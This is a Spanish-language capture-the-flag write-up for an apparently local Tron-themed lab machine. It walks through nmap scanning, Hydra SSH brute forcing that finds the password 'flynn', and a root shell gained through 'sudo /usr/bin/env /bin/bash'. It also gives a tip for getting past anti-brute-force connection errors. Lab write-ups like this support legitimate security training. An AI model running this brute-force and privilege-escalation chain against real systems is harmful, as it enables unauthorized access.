
## 1. Reconocimiento

```bash
nmap -sVC -p- --min-rate 5000 172.17.0.2 -oG nmap
```

| Puerto | Servicio | Detalle |
|--------|----------|---------|
| 22 | SSH | OpenSSH 10.2p1 Ubuntu |
| 80 | HTTP | Apache httpd 2.4.66 (Ubuntu) |

---

## 2. Enumeración web — disclosure del usuario

```bash
curl http://172.17.0.2
```

```html
<h1>flynn</h1>
<img src="flynn.png">
```

La web expone el nombre de usuario directamente en el HTML. La imagen `flynn.png` no contiene metadatos ni datos ocultos relevantes. Gobuster confirma que no hay más rutas — solo `index.html`.

---

## 3. Fuerza bruta SSH con Hydra

Con el usuario `flynn` identificado, se prueba primero una lista de contraseñas temáticas del universo Tron antes de lanzar rockyou:

```bash
hydra -l flynn -P tron_pass.txt ssh://172.17.0.2 -t 4
```

```
[22][ssh] host: 172.17.0.2   login: flynn   password: flynn
```

La contraseña es el mismo nombre de usuario.

> Nota: Si Hydra falla con "all children were disabled due to connection errors", el servidor puede tener un mecanismo anti-fuerza-bruta activo. Solución: reducir threads a `-t 1` con `-W 5` para verificar que la conexión funciona, luego subir a `-t 4` con la known_hosts limpia (`ssh-keygen -R 172.17.0.2`).

---

## 4. Acceso SSH

```bash
ssh flynn@172.17.0.2
# contraseña: flynn
```

```
Welcome to Ubuntu 26.04 LTS
flynn@687ec7404c82:~$
```

---

## 5. Escalada a root — env con sudo

```bash
sudo -l
```

```
User flynn may run the following commands on 687ec7404c82:
    (ALL) NOPASSWD: /usr/bin/env
```

`env` puede ejecutar programas arbitrarios heredando el contexto de sudo. Un único comando da la shell de root:

```bash
sudo /usr/bin/env /bin/bash
```

```bash
root@687ec7404c82:/home/flynn# id
uid=0(root) gid=0(root) groups=0(root)
```

---

## 6. Post-explotación

```bash
cat /root/password.txt
```

El archivo contiene enlaces externos como easter egg temático del CTF — guiños al universo Tron Legacy sin valor operativo.